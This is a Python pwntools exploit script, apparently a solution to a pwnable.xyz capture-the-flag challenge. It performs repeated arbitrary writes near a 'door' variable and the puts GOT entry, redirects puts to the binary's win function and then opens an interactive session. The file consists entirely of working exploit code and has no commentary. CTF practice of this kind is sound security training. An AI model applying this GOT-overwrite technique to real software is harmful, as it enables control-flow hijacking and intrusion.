from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30039)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
bss_start = 0x0000000000601080
door = 0x0000000000601244
win = e.symbols['win']
fini_arrry = 0x0000000000600e10

def _open(addr):
	sa('>','2')
	sa(':',str(addr))

def enter():
	sa('>','3')

_open(door+4)
enter()
_open(door+3)
enter()
_open(door+3)
enter()
_open(door+2)
enter()
_open(door+1)
enter()

_open(e.got['puts']+5)
enter()
_open(e.got['puts']+4)
enter()
_open(e.got['puts']+3)
enter()
_open(e.got['puts']+2)
enter()
_open(e.got['puts']+1)
enter()
_open(e.got['puts'])
enter()

c = 0
for i in range(256):
	_open(i)
	sa('>','1')
	if 'Door' in p.recvuntil(':'):
		p.send(str(win))
		sa('Realm:',str(e.got['puts']))
		c = 1
	if c == 1:
		break

sa('>','999')

p.interactive()